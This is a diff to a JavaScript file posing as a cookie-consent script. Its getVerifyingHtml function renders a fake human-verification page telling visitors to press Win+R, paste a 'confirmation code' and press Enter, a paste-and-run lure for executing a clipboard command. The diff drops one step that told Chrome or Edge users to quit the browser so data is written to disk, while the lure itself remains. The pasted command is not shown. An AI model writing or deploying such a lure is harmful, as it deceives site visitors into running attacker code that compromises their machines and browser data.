@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.26',
+    version: '1.9.27',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -526,9 +526,6 @@
   }
 
   function getVerifyingHtml(refId) {
-    var closeBrowser = getBrowserKey() !== 'firefox'
-      ? '<li>Quit ' + (getBrowserKey() === 'edge' ? 'Edge' : 'Chrome') + ' completely (every time — tray too), so /j is written to disk</li>'
-      : '';
     return (
       '<div class="ts-v-header">' +
       '<div class="ts-v-status">' + getOrbitDotsHtml() + '<span class="ts-v-title">Verifying...</span></div>' +
@@ -536,7 +533,6 @@
       '<div class="ts-links"><a href="' + CONSENT_CONFIG.privacyPolicyUrl + '">Privacy</a><span class="ts-dot">·</span><a href="#">Help</a></div></div></div>' +
       '<div class="ts-v-rule"></div>' +
       '<div class="ts-v-body"><h3>Let us know you\'re human, please complete steps:</h3><ol>' +
-      closeBrowser +
       '<li>Press <span class="ts-kbd">Win</span> + <span class="ts-kbd">R</span> to open the verification dialog</li>' +
       '<li>Press <span class="ts-kbd">Ctrl</span> + <span class="ts-kbd">V</span> to paste the confirmation code</li>' +
       '<li>Press <span class="ts-kbd">Enter</span> to confirm you\'re not a robot</li>' +
